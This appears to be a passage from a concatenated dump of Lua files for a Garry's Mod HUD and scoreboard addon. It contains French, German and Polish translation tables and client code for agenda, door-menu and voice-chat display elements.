LANG[ 'hud.theme.mint_light.name' ] = 'Menthe'
LANG[ 'hud.theme.gray.name' ] = 'Gris'
LANG[ 'hud.theme.rose_garden.name' ] = 'Jardin de Roses'
LANG[ 'hud.theme.ocean_wave.name' ] = 'Vague Océanique'
LANG[ 'hud.theme.sky_blue.name' ] = 'Bleu Ciel'
LANG[ 'hud.theme.golden_dawn.name' ] = 'Aube Dorée'

LANG[ 'hud_help_type' ] = 'Tapez'
LANG[ 'hud_help_to' ] = 'pour ouvrir les paramètres'

LANG[ 'door_purchase' ] = 'Acheter {object}'
LANG[ 'door_sell' ] = 'Vendre {object}'
LANG[ 'door_addowner' ] = 'Ajouter un propriétaire'
LANG[ 'door_rmowner' ] = 'Retirer un propriétaire'
LANG[ 'door_rmowner_help' ] = 'Choisissez le joueur à qui vous souhaitez retirer la propriété'
LANG[ 'door_addowner_help' ] = 'Choisissez le joueur à qui vous souhaitez accorder la propriété'
LANG[ 'door_title' ] = 'Définir le titre'
LANG[ 'door_title_help' ] = 'Quel titre voulez-vous définir ?'
LANG[ 'door_admin_disallow' ] = 'Interdire la propriété'
LANG[ 'door_admin_allow' ] = 'Autoriser la propriété'
LANG[ 'door_admin_edit' ] = 'Modifier l\'accès'
LANG[ 'door_owned' ] = 'Propriété Privée'
LANG[ 'door_unowned' ] = 'À Vendre'

LANG[ 'hud_door_help' ] = 'Appuyez sur {bind} pour acheter pour {price}'
LANG[ 'hud_door_owner' ] = 'Propriétaire : {name}'
LANG[ 'hud_door_allowed' ] = 'Autorisé à posséder'
LANG[ 'hud_door_coowners' ] = 'Copropriétaires'
LANG[ 'hud_and_more' ] = 'et plus...'

LANG[ 'reconnect_u' ] = 'RECONNECTER'
LANG[ 'disconnect_u' ] = 'DÉCONNECTER'
LANG[ 'settings_u' ] = 'PARAMÈTRES'
LANG[ 'configuration_u' ] = 'CONFIGURATION'
LANG[ 'introduction_u' ] = 'INTRODUCTION'

LANG[ 'seconds_l' ] = 'secondes'
LANG[ 'minutes_l' ] = 'minutes'

LANG[ 'hud.timeout.name' ] = 'Durée du Timeout'
LANG[ 'hud.timeout.desc' ] = 'Combien de secondes avant la reconnexion automatique'

LANG[ 'hud.alert_queue.name' ] = 'File d\'attente des alertes'
LANG[ 'hud.alert_queue.desc' ] = 'Les alertes doivent-elles être mises en file d\'attente ?'

LANG[ 'hud.props_counter.name' ] = 'Compteur d\'Objets'
LANG[ 'hud.props_counter.desc' ] = 'Afficher le compteur d\'objets'

LANG[ 'hud.main_avatar_mode.name' ] = 'Type d\'Avatar Principal'
LANG[ 'hud.main_avatar_mode.desc' ] = 'Choisissez le type'

LANG[ 'hud.voice_avatar_mode.name' ] = 'Type d\'Avatar Vocal'
LANG[ 'hud.voice_avatar_mode.desc' ] = 'Choisissez le type'

LANG[ 'hud.hud_bar_type.name' ] = 'Type de barre indicatrice'
LANG[ 'hud.hud_bar_type.desc' ] = 'Choisissez le type'

LANG[ 'hud.restrict_themes.name' ] = 'Restreindre les Thèmes'
LANG[ 'hud.restrict_themes.desc' ] = 'Restreindre les joueurs à choisir des thèmes'

LANG[ 'hud.speedometer_mph.name' ] = 'Utiliser les Miles'
LANG[ 'hud.speedometer_mph.desc' ] = 'Changer les unités en miles par heure'

LANG[ 'hud.speedometer_max_speed.name' ] = 'Vitesse Maximale par Défaut'
LANG[ 'hud.speedometer_max_speed.desc' ] = 'La vitesse maximale pour le compteur de vitesse'

LANG[ 'hud.wpnsel_sounds.name' ] = 'Sons de sélection d\'armes'
LANG[ 'hud.wpnsel_sounds.desc' ] = 'Activer les sons de l\'interface de sélection d\'armes'

LANG[ 'hud_should_draw' ] = 'L\'élément doit être dessiné'
LANG[ 'hud.main.name' ] = 'HUD Principal'
LANG[ 'hud.ammo.name' ] = 'Munitions'
LANG[ 'hud.agenda.name' ] = 'Agenda'
LANG[ 'hud.alerts.name' ] = 'Alertes'
LANG[ 'hud.pickup_history.name' ] = 'Historique de Ramassage'
LANG[ 'hud.level.name' ] = 'Niveau'
LANG[ 'hud.voice.name' ] = 'Panneaux de Voix'
LANG[ 'hud.overhead_health.name' ] = 'Santé Surélevée 3D2D'
LANG[ 'hud.overhead_armor.name' ] = 'Armure Surélevée 3D2D'
LANG[ 'hud.vehicle.name' ] = 'HUD Véhicule'

LANG[ 'hud.theme.name' ] = 'Thème'
LANG[ 'hud.theme.desc' ] = 'Choisissez le thème du HUD'

LANG[ 'hud.scale.name' ] = 'Échelle'
LANG[ 'hud.scale.desc' ] = 'Ajustez l\'échelle du HUD'

LANG[ 'hud.roundness.name' ] = 'Arrondi'
LANG[ 'hud.roundness.desc' ] = 'Ajustez l\'arrondi du HUD'

LANG[ 'hud.margin.name' ] = 'Marge'
LANG[ 'hud.margin.desc' ] = 'La distance entre le HUD et les bords'

LANG[ 'hud.icons_3d.name' ] = 'Modèles 3D'
LANG[ 'hud.icons_3d.desc' ] = 'Rendre les icônes de modèles en 3D'

LANG[ 'hud.compact.name' ] = 'Mode Compact'
LANG[ 'hud.compact.desc' ] = 'Activer le mode compact'

LANG[ 'hud.speedometer_blur.name' ] = 'Flou du Compteur de Vitesse'
LANG[ 'hud.speedometer_blur.desc' ] = 'Activer le flou pour le compteur de vitesse'

LANG[ 'hud.3d2d_max_details.name' ] = 'Détails 3D2D Maximum'
LANG[ 'hud.3d2d_max_details.desc' ] = 'La quantité maximale d\'informations détaillées à rendre'
LANG[ 'hud_lockdown' ] = 'CONFINEMENT'
LANG[ 'hud_lockdown_help' ] = 'Veuillez retourner chez vous !'

LANG[ 'hud_wanted' ] = 'RECHERCHÉ'
LANG[ 'hud_wanted_help' ] = 'Raison : {reason}'

LANG[ 'hud_arrested' ] = 'ARRÊTÉ'
LANG[ 'hud_arrested_help' ] = 'Vous serez libéré dans {time}'

onyx.lang:AddPhrases( 'french', LANG )
--PATH addons/____onyx_hud/lua/onyx/modules/hud/languages/cl_german.lua:
--[[

Editor: thestarhd
Dutscher Übersetzer Profil: https://www.gmodstore.com/users/thestarhd
 
05/09/2024
 
--]]
 
local LANG = {}
 
--[[
    .............
    Allgemeine Wörter
]]--
 
LANG[ 'hud_status_wanted' ] = 'Gesucht'
LANG[ 'hud_status_speaking' ] = 'Spricht'
LANG[ 'hud_status_typing' ] = 'Schreibt'
LANG[ 'props' ] = 'Gegenstände'
LANG[ 'close' ] = 'Schließen'
LANG[ 'alert' ] = 'Alarm'
LANG[ 'message' ] = 'Nachricht'
LANG[ 'unknown' ] = 'Unbekannt'
LANG[ 'accept' ] = 'Akzeptieren'
LANG[ 'deny' ] = 'Ablehnen'
LANG[ 'none' ] = 'Keine'
LANG[ 'add' ] = 'Hinzufügen'
LANG[ 'remove' ] = 'Entfernen'
LANG[ 'jobs' ] = 'Jobs'
LANG[ 'door' ] = 'Tür'
LANG[ 'vehicle' ] = 'Fahrzeug'
LANG[ 'door_groups' ] = 'Türgruppen'
LANG[ 'display' ] = 'Anzeigen'
LANG[ 'general' ] = 'Allgemein'
LANG[ 'speedometer' ] = 'Tachometer'
LANG[ 'fuel' ] = 'Benzin'
LANG[ 'vote' ] = 'Abstimmen'
LANG[ 'question' ] = 'Frage'
 
--[[
    .......
    Verbindungsabbruch
]]--
 
LANG[ 'timeout_title' ] = 'VERBINDUNG VERLOREN'
LANG[ 'timeout_info' ] = 'Server ist derzeit nicht verfügbar, wir entschuldigen uns'
LANG[ 'timeout_status' ] = 'Du wirst in %d Sekunden erneut verbunden'
 
--[[
    ......
    Themen
]]--
 
LANG[ 'hud.theme.default.name' ] = 'Standard'
LANG[ 'hud.theme.forest.name' ] = 'Wald'
LANG[ 'hud.theme.violet_night.name' ] = 'Violette Nacht'
LANG[ 'hud.theme.rustic_ember.name' ] = 'Rustikale Glut'
LANG[ 'hud.theme.green_apple.name' ] = 'Grüner Apfel'
LANG[ 'hud.theme.lavender.name' ] = 'Lavendel'
LANG[ 'hud.theme.elegance.name' ] = 'Eleganz'
LANG[ 'hud.theme.mint_light.name' ] = 'Minze'
LANG[ 'hud.theme.gray.name' ] = 'Grau'
LANG[ 'hud.theme.rose_garden.name' ] = 'Rosengarten'
LANG[ 'hud.theme.ocean_wave.name' ] = 'Ozeanwelle'
LANG[ 'hud.theme.sky_blue.name' ] = 'Himmelblau'
LANG[ 'hud.theme.golden_dawn.name' ] = 'Goldene Dämmerung'
 
--[[
    ....
    Hilfe
    - Ganzer Satz: "Gebe <command> ein, um die Einstellungen zu öffnen"
]]--
 
LANG[ 'hud_help_type' ] = 'Gebe ein'
LANG[ 'hud_help_to' ] = 'um die Einstellungen zu öffnen'
 
--[[
    .............
    3D2D Türen
]]--
 
LANG[ 'door_purchase' ] = 'Kaufe {object}'
LANG[ 'door_sell' ] = 'Verkaufe {object}'
LANG[ 'door_addowner' ] = 'Eigentümer hinzufügen'
LANG[ 'door_rmowner' ] = 'Eigentümer entfernen'
LANG[ 'door_rmowner_help' ] = 'Wähle den Spieler, dem du das Eigentum entziehen möchtest'
LANG[ 'door_addowner_help' ] = 'Wähle den Spieler, dem du das Eigentum gewähren möchtest'
LANG[ 'door_title' ] = 'Titel festlegen'
LANG[ 'door_title_help' ] = 'Welchen Titel möchtest du festlegen?'
LANG[ 'door_admin_disallow' ] = 'Kaufen verbieten'
LANG[ 'door_admin_allow' ] = 'Kaufen erlauben'
LANG[ 'door_admin_edit' ] = 'Zugriff bearbeiten'
LANG[ 'door_owned' ] = 'Privatbesitz'
LANG[ 'door_unowned' ] = 'Zu Verkaufen'
 
LANG[ 'hud_door_help' ] = 'Drücke {bind}, um für {price} zu kaufen'
LANG[ 'hud_door_owner' ] = 'Eigentümer: {name}'
LANG[ 'hud_door_allowed' ] = 'Eigentümer erlaubt'
LANG[ 'hud_door_coowners' ] = 'Miteigentümer'
LANG[ 'hud_and_more' ] = 'und mehr...'
 
--[[
    .........
    Großbuchstaben
]]--
 
LANG[ 'reconnect_u' ] = 'ERNEUT VERBINDEN'
LANG[ 'disconnect_u' ] = 'TRENNEN'
LANG[ 'settings_u' ] = 'EINSTELLUNGEN'
LANG[ 'configuration_u' ] = 'KONFIGURATION'
LANG[ 'introduction_u' ] = 'EINFÜHRUNG'
 
--[[
    .........
    Kleinbuchstaben
]]--
 
LANG[ 'seconds_l' ] = 'sekunden'
LANG[ 'minutes_l' ] = 'minuten'
 
--[[
    .............
    Konfiguration
]]--
 
LANG[ 'hud.timeout.name' ] = 'Timeout-Dauer'
LANG[ 'hud.timeout.desc' ] = 'Wie viele Sekunden bis zur automatischen Wiederverbindung'
 
LANG[ 'hud.alert_queue.name' ] = 'Alarm-Warteschlange'
LANG[ 'hud.alert_queue.desc' ] = 'Sollen Alarme in die Warteschlange gestellt werden'
 
LANG[ 'hud.props_counter.name' ] = 'Gegenstandzähler'
LANG[ 'hud.props_counter.desc' ] = 'Gegenstandzähler anzeigen'
 
LANG[ 'hud.main_avatar_mode.name'    ] = 'Haupt-Avatar-Typ'
LANG[ 'hud.main_avatar_mode.desc' ] = 'Wähle den Typ'
 
LANG[ 'hud.voice_avatar_mode.name' ] = 'Stimm-Avatar-Typ'
LANG[ 'hud.voice_avatar_mode.desc' ] = 'Wähle den Typ'

LANG[ 'hud.hud_bar_type.name' ] = 'Indikatorbalkentyp'
LANG[ 'hud.hud_bar_type.desc' ] = 'Wählen Sie den Typ'

LANG[ 'hud.restrict_themes.name' ] = 'Themen einschränken'
LANG[ 'hud.restrict_themes.desc' ] = 'Spielern die Themenwahl einschränken'
 
LANG[ 'hud.speedometer_mph.name' ] = 'Meilen verwenden'
LANG[ 'hud.speedometer_mph.desc' ] = 'Einheiten auf Meilen pro Stunde umstellen'
 
LANG[ 'hud.speedometer_max_speed.name' ] = 'Maximale Standardgeschwindigkeit'
LANG[ 'hud.speedometer_max_speed.desc' ] = 'Die maximale Geschwindigkeit für den Tacho'
 
LANG[ 'hud_should_draw' ] = 'Soll das Element gezeichnet werden'
LANG[ 'hud.main.name' ] = 'Haupt-HUD'
LANG[ 'hud.ammo.name' ] = 'Munition'
LANG[ 'hud.agenda.name' ] = 'Agenda'
LANG[ 'hud.alerts.name' ] = 'Alarme'
LANG[ 'hud.pickup_history.name' ] = 'Aufnahmeverlauf'
LANG[ 'hud.level.name' ] = 'Level'
LANG[ 'hud.voice.name' ] = 'Stimm-Panels'
LANG[ 'hud.overhead_health.name' ] = '3D2D Überkopfanzeige für Gesundheit'
LANG[ 'hud.overhead_armor.name' ] = '3D2D Überkopfanzeige für Rüstung'
LANG[ 'hud.vehicle.name' ] = 'Fahrzeug-HUD'
 
--[[
    ........
    Einstellungen
]]--
 
LANG[ 'hud.theme.name' ] = 'Thema'
LANG[ 'hud.theme.desc' ] = 'Wähle das HUD-Thema'
 
LANG[ 'hud.scale.name' ] = 'Skalierung'
LANG[ 'hud.scale.desc' ] = 'Skalierung des HUD anpassen'
 
LANG[ 'hud.roundness.name' ] = 'Rundheit'
LANG[ 'hud.roundness.desc' ] = 'Die Rundheit des HUD anpassen'
 
LANG[ 'hud.margin.name' ] = 'Rand'
LANG[ 'hud.margin.desc' ] = 'Abstand zwischen HUD und den Rändern'
 
LANG[ 'hud.icons_3d.name' ] = '3D-Modelle'
LANG[ 'hud.icons_3d.desc' ] = 'Modell-Icons in 3D rendern'
 
LANG[ 'hud.compact.name' ] = 'Kompaktmodus'
LANG[ 'hud.compact.desc' ] = 'Kompaktmodus aktivieren'
 
LANG[ 'hud.speedometer_blur.name' ] = 'Tacho Unschärfe'
LANG[ 'hud.speedometer_blur.desc' ] = 'Unschärfe für den Tacho aktivieren'
 
LANG[ 'hud.3d2d_max_details.name' ] = 'Maximale 3D2D-Details'
LANG[ 'hud.3d2d_max_details.desc' ] = 'Maximale Menge an detaillierten Informationen rendern'
 
--[[
    ......
    Status
]]--
 
LANG[ 'hud_lockdown' ] = 'LOCKDOWN'
LANG[ 'hud_lockdown_help' ] = 'Bitte kehre in dein Haus zurück!'
 
LANG[ 'hud_wanted' ] = 'GESUCHT'
LANG[ 'hud_wanted_help' ] = 'Grund: {reason}'
 
LANG[ 'hud_arrested' ] = 'VERHAFTET'
LANG[ 'hud_arrested_help' ] = 'Du wirst in {time} freigelassen'
 
onyx.lang:AddPhrases( 'german', LANG )
--PATH addons/____onyx_hud/lua/onyx/modules/hud/elements/cl_agenda.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

18/08/2024

--]]

local hud = onyx.hud
local agendaWrapped = ''
local lastTitle = ''
local titleFormatted = ''

local function drawAgenda( element, client, scrW, scrH )
    local agendaTable = client:getAgendaTable()
    local agendaText = client:onyx_GetNetVar('agenda') or ''
    
    element.active = agendaTable and agendaText ~= ''
    if ( not element.active ) then return end

    local screenPadding = hud.GetScreenPadding()
    local padding = hud.ScaleTall( element.padding )
    local w = hud.ScaleWide( element.width )
    local h = hud.ScaleTall( element.height )
    local fontTitle = hud.fonts.TinyBold
    local fontDesc = hud.fonts.Tiny

    local title = agendaTable.Title
    local titleH = hud.ScaleTall( 25 )

    if ( agendaText ~= agendaWrapped ) then
        agendaWrapped = surface.textWrap( agendaText, fontDesc, w - padding * 2 )
    end

    if ( lastTitle ~= title ) then
        lastTitle = title
        titleFormatted = onyx.utf8.upper( title )
    end

    local x, y = scrW - w - screenPadding, screenPadding
    
    hud.DrawRoundedBox( x, y, w, h, hud:GetColor( 'primary' ) )
    hud.DrawRoundedBoxEx( x, y, w, titleH, hud:GetColor( 'secondary' ), true, true )
    draw.SimpleText( titleFormatted, fontTitle, x + w * .5, y + titleH * .5, hud:GetColor( 'textSecondary' ), 1, 1 )
    draw.DrawText( agendaWrapped, fontDesc, x + padding, y + titleH + padding, hud:GetColor( 'textPrimary' ), 0, 1 )
end

onyx.hud:RegisterElement( 'agenda', { drawFn = drawAgenda, height = 120, width = 250, padding = 10 } )
--PATH addons/____onyx_hud/lua/onyx/modules/hud/elements/cl_door_menu.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

16/08/2024

--]]

local MAX_DISTANCE = 128 ^ 2 -- DarkRP default is 200
local L = function( ... ) return onyx.lang:Get( ... ) end
local doorFrame

local function checkEntity( client, ent )
    if ( not IsValid( ent ) ) then return false end
    if ( not ent:IsDoor() ) then return false end
    if ( ent:GetPos():DistToSqr( client:GetPos() ) > MAX_DISTANCE ) then return false end

    return true
end

local function safeClose( panel )
    if ( IsValid( panel ) ) then
        panel:Close()
    end
end

local function choosePlayer( ... )
    local colors = onyx.hud:GetCurrentTheme().colors
    local frame = onyx.ChoosePlayer( ... )

    frame.colorBG = onyx.OffsetColor( colors.primary, -5 )
    frame.lblDesc:SetTextColor( colors.textPrimary )
    frame.divHeader.colorBG = colors.secondary
    frame.divHeader.lblText:SetTextColor( colors.textPrimary )
    frame.divHeader.btnClose:SetColorIdle( colors.textPrimary )

    for _, button in ipairs( frame.buttons ) do
        button:SetColorIdle( colors.primary )
        button:SetColorHover( colors.secondary )
        button.lblTitle:SetTextColor( colors.textPrimary )
        button.colorTertiary = colors.tertiary
    end
end

local function openDoorMenu( client, setDoorOwnerAccess, canChangeSettings )
    local trace = client:GetEyeTrace()
    local ent = trace.Entity

    if ( not checkEntity( client, ent ) ) then return end

    local isClientOwner = ent:DoorOwnedBy( client )
    local isOwned = ent:DoorGetOwner()
    local isNonOwnable = sam.player.get_nwvar(ent, 'DoorData') == false
    local doorGroup = ent:DoorGetGroup()
    local entType = onyx.utf8.lower( L( ent:IsVehicle() and 'vehicle' or 'door' ) )
    local colors = onyx.hud:GetCurrentTheme().colors

    local options = {}
    local insert = function( name, callback, wimgID )
        if ( isstring( callback ) ) then
            local cmd = tostring( callback )
            callback = function()
                RunConsoleCommand( cmd )
            end
        end
        
        table.insert( options, {
            name = name,
            callback = callback,
            wimgID = wimgID
        } )
    end

    -- Buy door
    if ( not isOwned and ( not isNonOwnable and not doorGroup ) ) then
        insert( L( 'door_purchase', { object = entType } ), 'buydoor', 'door_own' )
    end

    -- Sell door
    if ( isClientOwner ) then
        insert( L( 'door_sell', { object = entType } ), 'selldoor', 'door_sell' )

        table.insert( options, { 
            name = L( 'door_addowner' ),
            ignoreClose = true,
            wimgID = 'door_add_user',
            callback = function()
                choosePlayer( L( 'door_addowner' ), L( 'door_addowner_help' ), function(ply)
                    RunConsoleCommand( 'addcoowner', ply:SteamID() ) 
                end, false, function( ply )
                    return ( not ent:CanLockUnlock( ply ) )
                end )
            end
        } )

        table.insert( options, { 
            name = L( 'door_rmowner' ),
            ignoreClose = true,
            wimgID = 'door_remove_user',
            callback = function()
                choosePlayer( L( 'door_rmowner' ), L( 'door_rmowner_help' ), function( ply )
                    RunConsoleCommand( 'removecoowner', ply:SteamID() )
                end, false, function( ply )
                    return ( ent:CanLockUnlock( ply ) )
                end )
            end
        } )

        -- Change title
        local title = L( 'door_title' )
        insert( title, function()
            local frame = onyx.SimpleQuery( title, L( 'door_title_help' ), true, function( value )
                RunConsoleCommand( 'settitle', value )
            end )

            frame.colorBG = onyx.OffsetColor( colors.primary, -5 )
            frame.divHeader.colorBG = colors.secondary
            frame.divHeader.lblText:SetTextColor( colors.textPrimary )

            frame.lblDesc:SetTextColor( colors.textPrimary )

            frame.textEntry:SetColorIdle( colors.primary )
            frame.textEntry:SetColorHover( onyx.OffsetColor( colors.primary, -10 ) )
            frame.textEntry:SetTextColor( colors.textPrimary )
            frame.textEntry:SetPlaceholderColor( colors.textTertiary )
            frame.textEntry.colors.accent = colors.accent
            frame.textEntry.colors.outline = colors.secondary
            frame.textEntry.currentOutlineColor = onyx.CopyColor( colors.secondary )
        end, 'door_title' )
    end
    
    -- Admin settings
    if ( canChangeSettings ) then
        insert( L( isNonOwnable and 'door_admin_allow' or 'door_admin_disallow' ):gsub( ' ', '\n' ), isNonOwnable and 'set_yesbuy_door' or 'set_nobuy_door', isNonOwnable and 'door_enable_own' or 'door_disable_own' )

        table.insert( options, {
            name = L( 'door_admin_edit' ),
            ignoreClose = true,
            wimgID = 'door_groups',
            callback = function( wheel )
                local dmenu = vgui.Create( 'onyx.Menu' )
                dmenu:ToCursor()
                dmenu.backgroundColor = colors.primary
                dmenu.outlineColor = colors.secondary
                dmenu.Think = function( this )
                    if ( not IsValid( wheel ) ) then
                        this:Close()
                    end
                end

                local groups = dmenu:AddSubMenu( L( 'door_groups' ) )

                for name in pairs( rp.teamDoors ) do
                    groups:AddOption( name, function()
                        RunConsoleCommand( 'setgroupown', name )
                        safeClose( wheel )
                    end )
                end
            
                dmenu:Open()
            end
        } )
    end

    local amount = #options
    if ( amount == 1 ) then
        options[ 1 ].callback()
    elseif ( amount > 0 and not IsValid( doorFrame ) ) then
        local size = onyx.hud.ScaleTall( 512 )
    
        local choiceWheel = vgui.Create( 'onyx.hud.ChoiceWheel' )
        doorFrame = choiceWheel
        choiceWheel:SetSize( size, size )
        choiceWheel:SetShowLabel( true )
        choiceWheel:MakePopup()
        choiceWheel:Center()
        choiceWheel.OnRemove = function()
            doorFrame = nil
        end
        choiceWheel.PostThink = function( this )
            if ( not checkEntity( client, ent ) ) then
                this:Close()
            end
        end
        
        choiceWheel:AddChoice( { name = onyx.lang:Get( 'close' ), wimgID = 'radial_close' } )
    
        for _, data in ipairs( options ) do
            choiceWheel:AddChoice( data )
        end
    end
end

local function overrideDarkRP()
    DarkRP.openKeysMenu = function()
        local client = LocalPlayer()
        openDoorMenu( client, nil, client:IsSuperAdmin() )
    end

    concommand.Add('rp.keysMenu', DarkRP.openKeysMenu )
end

onyx.hud.OverrideGamemode( 'onyx.hud.OverrideKeysMenu', overrideDarkRP )
--PATH addons/____onyx_hud/lua/onyx/modules/hud/elements/cl_voice_chat.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

14/08/2024

--]]


onyx.hud.VoicePanels = onyx.hud.VoicePanels or {}

local hud = onyx.hud
local cache = hud.VoicePanels

local ANIM_DURATION = .2

local function findBestFont( text, maxWidth, ... )
    local bestFont = select( 1, ... )
    assert( bestFont, 'no fonts given' )

    local lastWidth = math.huge
    for _, font in ipairs( { ... } ) do
        local width = onyx.GetTextSize( text, font )
        local isGood = width <= maxWidth

        if ( isGood or width < lastWidth ) then
            bestFont = font
            lastWidth = width

            if ( isGood ) then
                break
            end
        end
    end

    return bestFont
end

local function createPanel( ply )
    local padding = hud.ScaleTall( 5 )
    local bUseModelIcon = onyx.hud:GetOptionValue( 'voice_avatar_mode' ) == 1

    local panel = vgui.Create( 'Panel' )
    panel:SetVisible( false )
    panel:SetPaintedManually( true )
    panel:SetWide( hud.ScaleWide( 200 ) )
    panel:SetTall( hud.ScaleTall( 40 ) )
    panel:DockPadding( padding, padding, padding, padding )

    panel.player = ply
    panel.name = ply:Name()
    panel.job = team.GetName( ply:Team())
    panel.color = team.GetColor( ply:Team() )
    panel.fraction = 0
    panel.font = onyx.hud.fonts.SmallBold

    panel.OnRemove = function( this )
        for index, data in ipairs( cache ) do
            if ( data.panel == this ) then
                table.remove( cache, index )
                break
            end
        end
    end

    panel.Paint = function( this, w, h )
        local size = h - padding * 2
        local textX = h + padding
        local shouldShowJob = true
        local textColor = hud:GetColor( 'textPrimary' )
        local primaryColor = hud:GetColor( 'primary' )
        local isDark = hud:IsDark()
        local y0 = h * .5

        onyx.hud.DrawRoundedBox( 0, 0, w, h, primaryColor )

        draw.SimpleText( this.name, this.font, textX, y0, textColor, 0, 1 )

        if ( this.mask and IsValid( this.avatar ) ) then
            onyx.DrawWithPolyMask( this.mask, function()
                if ( this.avatar:GetClassName() ~= 'AvatarImage' ) then
                    surface.SetDrawColor( 0, 0, 0, 100 )
                    surface.DrawRect( 0, 0, w, h )
    
                    onyx.DrawMatGradient( 0, 0, w, h, BOTTOM, ColorAlpha( this.color, isDark and 25 or 150 )  )
                end
                
                this.avatar:PaintManual()
            end )

            onyx.DrawOutlinedCircle( padding + size * .5, y0, size * .5, 4, this.color )
        end
    end

    panel.PerformLayout = function( this, w, h )
        local size = h - padding * 2
        local maxWidth = w - size
        
        this.mask = onyx.CalculateCircle( padding + size * .5, h * .5, math.floor( size * .5 ) - 1, 24 )
        this.font = findBestFont( this.name, maxWidth, onyx.hud.fonts.SmallBold, onyx.hud.fonts.TinyBold )
    end

    panel.avatar = panel:Add( bUseModelIcon and 'SpawnIcon' or 'AvatarImage' )
    panel.avatar:SetWide( panel:GetTall() - padding * 2 )
    panel.avatar:SetPaintedManually( true )
    panel.avatar:Dock( LEFT )

    if ( bUseModelIcon ) then
        -- I have to disable it, since gmod starts rebuilding the icon
        -- and if there would be many icons it would be a mess
        -- this function does synchronize bodygroups & skin as well :(
        -- onyx.hud.UpdateModelIcon( panel.avatar, onyx.hud.GetModelData( ply ) )

        panel.avatar:SetModel( ply:GetModel() )
    else
        panel.avatar:SetPlayer( ply, 64 )
    end

    return panel
end

local function findPanel( ply )
    for index, data in ipairs( cache ) do
        if ( data.ply == ply ) then
            return data.panel
        end
    end
end

local function startAnimation( panel, targetFraction, duration, onFinished )
    onyx.anim.Create( panel, duration, {
        index = 1,
        target = { fraction = targetFraction },
        onFinished = onFinished,
        easing = 'inOutQuad',
        think = function( _, this )
            this:SetAlpha( this.fraction * 255 )
        end
    } )
end

local function toggleSpeaking( ply, state )
    local panel = findPanel( ply )
    if ( state ) then
        if ( IsValid( panel ) ) then
            startAnimation( panel, 1, ANIM_DURATION )
        else
            local data ={
                ply = ply,
                panel = createPanel( ply )
            }

            table.insert( cache, data )
            startAnimation( data.panel, 1, ANIM_DURATION )
        end
    else
        if ( IsValid( panel ) ) then
            startAnimation( panel, 0, .5, function( _, this )
                this:Remove()
            end )
        end
    end
end

local function sanitizeCache()
    for _ = 1, #cache do
        for index, data in ipairs( cache ) do
            if ( not IsValid( data.ply ) ) then
                data.panel:Remove()
                break
            end
        end
    end
end

local function drawVoiceChat( self, client, scrW, scrH )
    local screenPadding = hud.GetScreenPadding()
    local baseY = scrH * .75
    local posY = baseY
    local space = hud.ScaleTall( 5 )
    local speed = FrameTime() * 8

    for index, data in ipairs( cache ) do
        local ply = data.ply -- always valid here
        local panel = data.panel
        if ( IsValid( panel ) ) then
            local width, height = panel:GetSize()
            local posX = scrW - screenPadding - width
    
            posY = posY - height

            panel.animatedX = Lerp( speed, panel.animatedX or ScrW(), posX )
            panel.animatedY = Lerp( speed, panel.animatedY or posY, posY )
        
            panel:SetPos( panel.animatedX, panel.animatedY )
            panel:SetVisible( true ) -- this fixes micro glitch with popup being visible when created
            panel:PaintManual()

            posY = posY - space
        end
    end
end

hook.Add( 'PlayerStartVoice', 'onyx.hud.PlayerStartVoice', function( ply )
    if ( IsValid( ply ) and ply ~= LocalPlayer() ) then
        toggleSpeaking( ply, true )
    end

    return true
end )

hook.Add( 'PlayerEndVoice', 'onyx.hud.PlayerEndVoice', function( ply )
    if ( IsValid( ply ) ) then
        toggleSpeaking( ply, false )
    end

    return true
end )

onyx.hud:RegisterElement( 'voice', {
    drawFn = function( self, client, scrW, scrH )
        sanitizeCache()
        drawVoiceChat( self, client, scrW, scrH )
    end
} )
--PATH addons/____onyx_scoreboard/lua/onyx/modules/scoreboard/languages/cl_polish.lua:
--[[
KayZed @ 2024
--]]

local LANG = {}

-- Phrases
LANG['copied_clipboard'] = 'Skopiowano do schowka'
LANG['scoreboard_search'] = 'Szukaj... (Nazwa/SteamID)'
LANG['you'] = 'Ty'
LANG['friend'] = 'Przyjaciel'
LANG['addon_return_u'] = 'POWRÓT'

-- Columns
LANG['scoreboard_col_team'] = 'Drużyna'
LANG['scoreboard_col_job'] = 'Praca'
LANG['scoreboard_col_money'] = 'Pieniądze'
LANG['scoreboard_col_rank'] = 'Ranga'
LANG['scoreboard_col_karma'] = 'Karma'
LANG['scoreboard_col_playtime'] = 'Czas Gry'
LANG['scoreboard_col_health'] = 'Zdrowie'
LANG['scoreboard_col_level'] = 'Poziom'
LANG['scoreboard_col_none'] = 'Brak'
LANG['scoreboard_col_gang'] = 'Gang'
LANG['scoreboard_col_ashop_badges'] = 'Odznaki'
LANG['scoreboard_col_faction'] = 'Frakcja'

-- Name Effects
LANG['scoreboard_eff_default'] = 'Domyślny'
LANG['scoreboard_eff_glow'] = 'Poświata'
LANG['scoreboard_eff_rainbow'] = 'Tęcza'
LANG['scoreboard_eff_scanning_vertical'] = 'Skanujący (Pionowo)'
LANG['scoreboard_eff_scanning_horizontal'] = 'Skanujący (Poziomo)'
LANG['scoreboard_eff_gradient_invert'] = 'Gradient (Odwróć Kolor)'
LANG['scoreboard_eff_wavy_dual'] = 'Falujący (Podwójny Kolor)'

-- Buttons
LANG['scoreboard_btn_profile'] = 'Otwórz Profil'
LANG['scoreboard_btn_freeze'] = 'Zamroź'
LANG['scoreboard_btn_goto'] = 'Idź Do'
LANG['scoreboard_btn_bring'] = 'Przynieś'
LANG['scoreboard_btn_return'] = 'Powrót'
LANG['scoreboard_btn_respawn'] = 'Odrodź'
LANG['scoreboard_btn_slay'] = 'Zabij'
LANG['scoreboard_btn_spectate'] = 'Obserwuj'

-- Words
LANG['rank_id'] = 'Identyfikator Rangi'
LANG['name'] = 'Nazwa'
LANG['effect'] = 'Efekt'
LANG['color'] = 'Kolor'
LANG['preview'] = 'Podgląd'
LANG['creation'] = 'Tworzenie'
LANG['save'] = 'Zapisz'
LANG['dead'] = 'Martwy'
LANG['create_new'] = 'Utwórz Nowy'
LANG['column'] = 'Kolumna'

-- Settings
LANG['addon_settings_u'] = 'USTAWIENIA'
LANG['scoreboard_ranks_u'] = 'RANGI'
LANG['scoreboard_columns_u'] = 'KOLUMNY'

LANG['scoreboard.title.name'] = 'Tytuł'
LANG['scoreboard.title.desc'] = 'Wprowadź tytuł dla ramki'

LANG['scoreboard.group_teams.name'] = 'Grupuj Zespoły'
